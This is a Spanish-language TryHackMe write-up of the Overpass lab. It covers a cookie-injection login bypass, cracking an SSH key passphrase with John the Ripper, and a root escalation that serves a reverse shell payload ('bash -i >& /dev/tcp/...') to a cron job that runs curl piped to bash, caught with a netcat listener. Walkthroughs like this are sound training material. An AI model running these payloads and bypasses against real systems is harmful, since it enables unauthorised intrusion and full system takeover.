# 💻 Write-up de TryHackMe: Overpass 🔐

Bienvenido a este recorrido por la máquina Overpass de TryHackMe! A continuación, documentaremos los pasos necesarios para obtener las banderas de usuario y root.

## 📜 Introducción

La sala Overpass nos sumerge en la historia de un grupo de estudiantes de Ciencias de la Computación que, por necesidad, deciden crear un gestor de contraseñas. 

Como es habitual en este tipo de escenarios, su "perfecto éxito comercial" oculta una serie de vulnerabilidades que exploraremos a fondo.

Esta máquina es un excelente desafío para principiantes e intermedios, ya que introduce conceptos esenciales en ciberseguridad, incluyendo:

🌐 Vulnerabilidades Web Básicas

🔑 Criptografía y Cifrados

🕵️ Análisis de Tráfico de Red (PCAP)

🔨 Cracking de Contraseñas

📄 Análisis de Código Fuente

Nuestro objetivo es doble: obtener la bandera de usuario (user.txt) y, posteriormente, escalar privilegios para obtener la bandera de root (root.txt).

# 🔎 Fase de Reconocimiento Inicial

## 🛡️ Paso 1: Verificación de Conectividad (Ping)

El primer paso en cualquier CTF es confirmar que la máquina objetivo está activa y que tenemos conectividad de red a ella. Para esto, utilizamos la herramienta ping con la opción -c 4 para enviar un total de cuatro paquetes ICMP al host objetivo.

<img width="649" height="322" alt="Ping" src="https://github.com/user-attachments/assets/68d909b4-9065-474d-880a-b30da640215e" />

Comando	Descripción

ping -c 4 10.10.13.243	Envía 4 paquetes ICMP al objetivo.

El resultado de 0% de pérdida de paquetes y tiempos de respuesta estables confirma que la máquina objetivo (10.10.13.243) está en línea y lista para la siguiente fase de escaneo.


## 🔍 Paso 2: Escaneo de Puertos con Herramienta Personalizada 🐍

Una vez confirmada la conectividad con el target, el siguiente paso es identificar qué servicios están activos en la IP 10.10.13.243. 

En lugar de usar herramientas conocidas como nmap, he utilizado mi propio Port Scanner desarrollado en Python, lo cual demuestra excelentes habilidades de desarrollo.


<img width="699" height="404" alt="portscanner puertos abiertos" src="https://github.com/user-attachments/assets/b3f430b8-b134-4c17-95ae-35e03f6e9f95" />


El escaneo de los primeros 2000 puertos TCP/UDP fue rápido y reveló dos puntos de acceso principales:

⚓ Puertos Abiertos Encontrados

Puerto	Servicio	Descripción

22	SSH	Secure Shell

80	HTTP	HyperText Transfer Protocol


⚠️ Análisis y Plan de Ataque

Los resultados de la herramienta nos proporcionan la información crítica para el camino a seguir:

Puerto 80 (HTTP): El puerto web es marcado como CRÍTICO por utilizar tráfico no cifrado. Esto significa que hay una aplicación web expuesta que debe ser nuestro primer vector de ataque.

Puerto 22 (SSH): El servicio SSH requiere credenciales válidas. Lo mantendremos en espera hasta que hayamos comprometido el servidor web y posiblemente encontrado credenciales de usuario.

Conclusión: La aplicación web en el puerto 80 será nuestro foco principal para iniciar la fase de enumeración.



## 🌐 Paso 3: Análisis de la Aplicación Web (Puerto 80)

Siguiendo el plan, accedemos al puerto 80 del objetivo utilizando un navegador web, navegando a http://10.10.13.243.

<img width="1624" height="594" alt="pagina puerto 80" src="https://github.com/user-attachments/assets/2614107c-9e6c-4a9e-82ad-4322f4e96e44" />


La página principal revela la landing page de "Overpass", una empresa que promociona un gestor de contraseñas supuestamente seguro para diversos sistemas operativos.

🔎 Hallazgos Clave en la Página

El texto de marketing de la compañía es muy relevante, ya que hace una serie de promesas que podrían apuntar a un fallo de seguridad:

🛡️ Cifrado: Afirman que las contraseñas están protegidas usando "Military Grade encryption".

💾 Almacenamiento: Claman que el gestor no almacena tus contraseñas y que nunca se transmiten por Internet.

Estas promesas sugieren una fuerte dependencia de la lógica del lado del cliente para la gestión de datos. A menudo, en CTFs, la seguridad implementada del lado del cliente es más fácil de eludir.


## 📁 Paso 4: Enumeración de Directorios con Gobuster

Aunque nuestra atención inicial estaba en /Downloads, es una buena práctica realizar una enumeración de directorios (o dirbusting) para descubrir rutas ocultas, especialmente aquellas que podrían ser paneles de administración.

Utilizamos la herramienta Gobuster en modo dir junto con un wordlist común para maximizar las posibilidades de éxito:

<img width="1367" height="361" alt="gobuster" src="https://github.com/user-attachments/assets/5a61afe8-5024-42c9-98de-d515b5d83129" />

````
Bash
gobuster dir -u http://10.10.13.243 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
````

🚨 Directorios Encontrados

El escaneo de Gobuster fue muy productivo, devolviendo varios códigos 301 (Redirección), lo que confirma la existencia de estas rutas en el servidor:

Directorio	Estado	Relevancia

/downloads	301	Directorio conocido de la página principal.

/aboutus	301	Directorio conocido de la página principal.

/img, /css	301	Directorios de activos web (imágenes, estilos).

/admin	301	¡Nuevo y Crítico!



## 🔑 Paso 5: Acceso al Directorio /admin y Análisis del Código Fuente

Navegamos a la ruta recién descubierta: http://10.10.13.243/admin/.

<img width="652" height="415" alt="pagina admin" src="https://github.com/user-attachments/assets/96ef4eb4-7196-473a-857b-7a34edf2b430" />


Como esperábamos, nos encontramos con una interfaz estándar de inicio de sesión de administrador (Overpass administrator login) que solicita un nombre de usuario y una contraseña.

📜 Análisis del Código Fuente

<img width="841" height="685" alt="codigo fuente pagina admin" src="https://github.com/user-attachments/assets/18cd5317-cd1e-4f3b-9485-fec051081c9f" />


Recordando que el marketing de Overpass sugería una gran dependencia en la lógica del lado del cliente (al no almacenar ni transmitir contraseñas), 

es crucial inspeccionar el código fuente (view-source:http://10.10.13.243/admin/) en busca de lógica de autenticación expuesta.

El código fuente (líneas 12-14) revela la inclusión de varios scripts de JavaScript. Destacan:

Archivo JS	Relevancia

login.js	Es el lugar más probable para encontrar la lógica de validación de credenciales.

cookie.js	Podría manejar las sesiones o tokens de autenticación del administrador.

main.js	Contiene funcionalidad general de la aplicación.


## ⚙️ Paso 6: Análisis de la Lógica de Autenticación en login.js

Inspeccionamos el contenido de http://10.10.13.243/login.js. El objetivo era encontrar las credenciales del administrador o el algoritmo de autenticación utilizado.

<img width="767" height="767" alt="archivo login js" src="https://github.com/user-attachments/assets/ff76610c-9fdf-4424-9dd7-5c692d5cf70d" />


🔎 Descubrimiento en la Función login()

Al examinar la función principal de autenticación, login(), descubrimos que la validación no se realiza completamente en el lado del cliente (en el navegador) como podríamos haber esperado. En su lugar, la función realiza lo siguiente:

Recuperación de Datos: Toma el valor ingresado en los campos de usuario y contraseña.

Llamada a la API: Construye un objeto (creds) y lo envía mediante una petición POST a un nuevo endpoint del backend: /api/login.

Validación: El script espera una respuesta del servidor. Si la respuesta no es el mensaje de error "Incorrect Credentials", asume que el inicio de sesión es exitoso, establece un cookie de sesión y permite el acceso.

````
JavaScript

const statusOrCookie = await postData("/api/login", creds); 
// ...
// Si es exitoso:
cookies.set("SessionToken", statusOrCookie); 
window.location = "/admin";
````

🎯 Siguiente Movimiento: Buscando la Fuente del Secreto

El secreto no está en login.js, sino en el servidor que procesa la llamada a /api/login. Sin embargo, es altamente improbable que podamos brute-forcear el endpoint sin más información.

Nuestra atención debe volver a los archivos de scripts que no hemos revisado aún, en busca de claves de cifrado, credenciales por defecto o cualquier otra información sensible que el desarrollador haya dejado expuesta. 

En el Paso 5 identificamos un segundo archivo JS importante: cookie.js.


## 🍪 Paso 7: Bypass por Manipulación de Cookies

Después de determinar en el paso anterior que la autenticación exitosa resulta en el establecimiento de un cookie llamado SessionToken, probamos una técnica de Authentication Bypass que explota la posible debilidad en la lógica del lado del cliente.

Hipótesis: Si la aplicación solo verifica la existencia de la cookie SessionToken (y no realiza una validación robusta del lado del servidor), podemos simplemente inyectar un valor falso para obtener acceso.

💉 Inyección del Token de Sesión

<img width="1435" height="734" alt="cambiamos el valor de la cokkie por unon nuestro" src="https://github.com/user-attachments/assets/bb00040e-8b13-4d31-9190-98a569327c3b" />


Utilizamos la consola de desarrollo del navegador para inyectar manualmente la cookie con un valor arbitrario. Esto simula una sesión exitosa sin haber pasado por el formulario de inicio de sesión:

Acción	Comando (Consola JS)

Inyectar Cookie	document.cookie = 'SessionToken=CookieValue; path=/'

Al establecer el cookie SessionToken con el valor ficticio CookieValue y recargar la página /admin, la aplicación nos permite el acceso.


## 🔑 Paso 8: Revelando la Clave Privada RSA del Usuario james

Tras el exitoso bypass de cookies (Paso 7), al recargar la página /admin, se nos concede acceso al contenido restringido del panel de administrador. Esta sección revela un mensaje crucial y un archivo sumamente valioso.

<img width="864" height="819" alt="actualizamos la pagina y obtenemos clave privada RSA del usuairo james" src="https://github.com/user-attachments/assets/5ac75885-c581-4555-b25d-5cbc5debb289" />


📜 Mensaje y Usuario Identificado

El mensaje, supuestamente de un desarrollador frustrado llamado "Paradox", está dirigido a un usuario específico: James.

"Since you keep forgetting your password, James, I've set up SSH keys for you."

Esto confirma la identidad del primer usuario del sistema: james. La pista indica que nuestro próximo paso debe ser usar SSH (Puerto 22, identificado en el Paso 2) para obtener una shell inicial.

🔐 Obtención de la Clave Privada (¡Cifrada!)

Justo debajo del mensaje encontramos una clave SSH privada en formato PEM:

Usuario Objetivo: james

Tipo de Clave: RSA PRIVATE KEY.

Estado: ENCRYPTED (Cifrada).

Cifrado Utilizado: AES-128-CBC.

La clave está lista para ser copiada:

-----BEGIN RSA PRIVATE KEY-----

Proc-Type: 4,ENCRYPTED

DEK-Info: AES-128-CBC, 9F85D92F34F42626F13A7493AB48F337

[...CLAVE CIFRADA...]


# 🔨 Paso 9: Crackeando la Passphrase con John the Ripper

Ahora que tenemos la clave privada RSA del usuario james (Paso 8) pero está cifrada, nuestro objetivo es crackear su passphrase para poder usarla vía SSH.

1️⃣ Preparación y Extracción del Hash

Primero, guardamos el contenido de la clave privada copiada del panel de administración en un archivo local llamado james_rsa.

Luego, utilizamos el script ssh2john.py (incluido con John the Ripper) para convertir la clave SSH cifrada en un formato de hash que la herramienta de cracking pueda leer:

````
Bash
$ /usr/share/john/ssh2john.py james_rsa > crack
````
Este comando guarda el hash de la contraseña en el archivo crack.

2️⃣ Crackeo de la Contraseña

Ejecutamos John the Ripper utilizando un wordlist conocido (rockyou.txt) para realizar un ataque de diccionario sobre el hash recién extraído:

````
Bash
$ john --wordlist=/home/quiqu3h4ck/rockyou.txt crack
````
🎉 Resultado del Crackeo

John the Ripper completa la sesión y nos proporciona el passphrase que estábamos buscando:

Usuario	Passphrase Encontrada

james	james13


## 🚪 Paso 10: Obtención de la Shell de Usuario vía SSH

Con la clave privada de james (james_rsa) y su passphrase (james13) en nuestro poder (resultado del Paso 10), es momento de acceder al servidor a través del servicio SSH (Puerto 22).

1️⃣ Permisos de la Clave

El cliente SSH exige que el archivo de clave privada tenga permisos restringidos (solo lectura y escritura para el dueño). Esto es un requisito de seguridad:

<img width="712" height="434" alt="mediante ssh y la clave obtenida entramos a la consolla " src="https://github.com/user-attachments/assets/caf7eaf1-dc1e-4c4a-8adb-108718aceb24" />

````
Bash
$ chmod 600 james_rsa
````

2️⃣ Conexión SSH Exitosa

Ahora, iniciamos la conexión como el usuario james utilizando la clave privada con la opción -i (identity file):

````
Bash
$ ssh james@10.10.13.243 -i james_rsa
````

Al ingresar la passphrase james13 en la solicitud, la autenticación es exitosa y obtenemos nuestra primera shell en el sistema.

````
Bash
james@overpass-prod:~$ 
````

🚩 Obtención de la Bandera user.txt

Una vez dentro, navegamos y localizamos la bandera de usuario, completando así la primera fase del CTF.

<img width="522" height="106" alt="obetenemos la flag" src="https://github.com/user-attachments/assets/3f8f2bbe-f34f-4de9-817b-65c14fbadb79" />


# 👑 Fase de Escalada de Privilegios

Hemos obtenido la shell de usuario como james y la bandera user.txt. Ahora, nuestro foco se mueve a la Escalada de Privilegios para obtener acceso como root y la bandera final.

## 📝 Paso 11: Enumeración del Sistema - Leyendo todo.txt

Como parte de la enumeración inicial del sistema, localizamos el archivo todo.txt en el directorio personal de james y lo inspeccionamos. Este archivo revela información crítica del equipo de desarrollo:

<img width="761" height="141" alt="leemos el archivo todo" src="https://github.com/user-attachments/assets/9d8f279f-dce2-4bfa-81c9-614b1c89c037" />

````
Bash
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
[...]
> Ask Paradox how he got the automated build script working and where the builds go.
They're not updating on the website
````

🧠 Análisis de Pistas

Este simple archivo de texto nos da tres pistas de alto valor para la escalada:

Nombres de Usuarios: Se mencionan dos nuevos posibles usuarios del sistema: Muirland y Paradox.

Mala Práctica de Seguridad: La nota sobre "escribir la contraseña en un sticky note" sugiere que los desarrolladores tienen contraseñas débiles o las almacenan de forma insegura.

Punto de Pivote Crítico: La pista más importante es la mención de un "automated build script" y la pregunta de "where the builds go" (dónde van las compilaciones). 

Esto sugiere un directorio o script que se ejecuta con altos privilegios (probablemente root) para compilar o desplegar la aplicación.


## 💾 Paso 12: Explotando el Gestor de Contraseñas overpass

La pista crítica del archivo todo.txt sobre la mala gestión de contraseñas nos dirige a la aplicación principal de la compañía: el gestor de contraseñas. Localizamos su binario en /usr/bin/overpass y procedemos a ejecutarlo.

<img width="526" height="171" alt="estta contraseña esta redactada" src="https://github.com/user-attachments/assets/8521812b-b894-44d6-9ef1-c1406c4aa8ba" />


🔓 Acceso a Credenciales Almacenadas

Ejecutamos el programa. A diferencia del panel web (Paso 5), este programa de consola nos da la opción de recuperar todas las credenciales almacenadas (Opción 4):

````
Bash
james@overpass-prod:~$ /usr/bin/overpass
Welcome to Overpass
Options:
[...]
4 Retrieve All Passwords
[...]
Choose an option: 4
system saydrawnlyingpicture
````

El programa expone un par de credenciales almacenadas:

Servicio	Contraseña

system	saydrawnlyingpicture

Probamos la contraseña pero no funcionó: 

<img width="488" height="47" alt="la contraseña obtenida no funciona" src="https://github.com/user-attachments/assets/c9d771fb-66df-45d5-a5e4-c4cc97d57afc" />


## 🔎 Paso 13: Enumeración Avanzada con LinPEAS

Vamos a utilizar una ruta de enumeración más exhaustiva para la escalada de privilegios utilizando la herramienta automatizada LinPEAS (Linux Privilege Escalation Awesome Script).

1️⃣ Transferencia del Script

Para llevar LinPEAS a la máquina víctima (10.10.13.243), primero configuramos un servidor HTTP básico en nuestra máquina atacante (Kali) y luego lo descargamos usando wget en el target:

<img width="1153" height="306" alt="usaremos linpeas " src="https://github.com/user-attachments/assets/1ae17565-333c-457f-a6fe-e170166eb7f6" />

Máquina Atacante (Kali):
````
Bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000
````

Máquina Víctima (james@overpass-prod):

<img width="1311" height="198" alt="pasamos el linpeas a l amaquina victima" src="https://github.com/user-attachments/assets/cf30f571-9777-4ba4-9604-f4d53ae3e683" />

Transferimos el archivo al directorio /tmp para asegurar que tenemos permisos de escritura:

````
Bash
james@overpass-prod:/tmp$ wget http://[TU_IP]:8000/linpeas.sh
````

2️⃣ Ejecución de LinPEAS

Una vez transferido, le otorgamos permisos de ejecución y lo corremos:

<img width="432" height="25" alt="ejecutamos el linpeas mucha info " src="https://github.com/user-attachments/assets/74b4895c-d8d8-4522-8aab-39abe8f64465" />

````
Bash
james@overpass-prod:/tmp$ chmod +x linpeas.sh
james@overpass-prod:/tmp$ ./linpeas.sh
````

3️⃣ Filtrando la "Mucha Info"

LinPEAS es potente y produce una gran cantidad de información. El desafío es filtrar este output para encontrar el vector de escalada.


## 👑 Paso 14: Explotación de Cron Job como Vector a Root

El filtrado de la abundante información arrojada por LinPEAS (Paso 13), o la enumeración manual de archivos críticos, nos lleva a inspeccionar el archivo de tareas programadas del sistema: /etc/crontab.

🚨 Descubrimiento del Cron Job Vulnerable

Inspeccionamos el archivo de configuración de cron jobs del sistema:

<img width="954" height="293" alt="arhcivo cron vemos un archivo buildscript" src="https://github.com/user-attachments/assets/85059b77-01c0-480f-b22e-af59bd254239" />

````
Bash
james@overpass-prod:/tmp$ cat /etc/crontab

[...]
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
````
Esta línea es el vector de escalada de privilegios más crítico:

Frecuencia: Se ejecuta cada minuto (* * * * *).

Usuario: Se ejecuta como root (máximos privilegios).

Acción: Descarga un script (buildscript.sh) de un dominio externo (overpass.thm) y lo ejecuta directamente a través de bash.


## 💥 Estrategia de Explotación (DNS Spoofing)

Para explotar esta vulnerabilidad, debemos lograr que la máquina víctima resuelva el dominio overpass.thm a nuestra propia IP de ataque. Esto nos permitirá servir nuestro propio script malicioso, el cual será ejecutado por root cada minuto.

1️⃣ Manipulación del Host File (Atacante)

Para que el servidor víctima resuelva el dominio a nuestra IP, debemos asegurarnos de que el DNS o el archivo hosts del target apunten a nuestra máquina. 

Asumiremos, como es común en este CTF, que el sistema DNS del target está configurado para resolver dominios personalizados a través de la red VPN, permitiendo la explotación.

En este caso particular de Overpass, el dominio overpass.thm debe apuntar a tu IP de atacante.

<img width="540" height="160" alt="arhicvo hosts" src="https://github.com/user-attachments/assets/e2b57351-0e82-4f8c-b7d7-544c080c7835" />


2️⃣ Creación del Script Malicioso

Creamos un archivo llamado buildscript.sh en nuestra máquina de ataque con el payload de reverse shell. Esto nos dará una shell con permisos de root:

<img width="1920" height="1080" alt="creo un arhcivo buildscript" src="https://github.com/user-attachments/assets/f2c6ca4b-bb1b-45ff-9459-8cebb1f5fb6b" />


````
Bash
#!/bin/bash
bash -i >& /dev/tcp/[TU_IP_VPN]/4444 0>&1
````

3️⃣ Configuración del Servidor y Listener

Guardamos el script en la ruta correcta (/downloads/src/buildscript.sh) en nuestra máquina atacante y levantamos el servidor HTTP, asegurándonos de usar el puerto 80 (el predeterminado para curl). 

Simultáneamente, configuramos un listener con netcat:

Máquina Atacante (Kali):

````
Bash
# 1. Configurar servidor web (en el directorio donde se guarda el script)
$ python3 -m http.server 80 
# 2. Configurar listener
$ nc -lvnp 4444
````

🏆 Shell de Root y Bandera Final

Al cabo de un minuto (cuando el cron job se ejecuta), el servidor víctima se conecta a nuestra máquina, descarga el script de reverse shell y lo ejecuta como root.

El listener de netcat recibe la conexión, dándonos acceso de root al sistema:

<img width="1480" height="224" alt="recibiendo comnicaccio" src="https://github.com/user-attachments/assets/bf80355e-4950-4b58-a0bd-0ce4c3a6393e" />

````
Bash
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.13.243] 58872
````


🚩 Obtención de root.txt

Finalmente, navegamos al directorio /root para obtener la bandera final:

<img width="400" height="109" alt="obtenemos la 2da flag" src="https://github.com/user-attachments/assets/22bfe3c2-8ee5-4cf1-bd35-cf321784e49e" />

````
Bash

# cd /root
# cat root.txt
[...CÓDIGO DE BANDERA FINAL...]
````

¡CTF Overpass Completado! 🎉
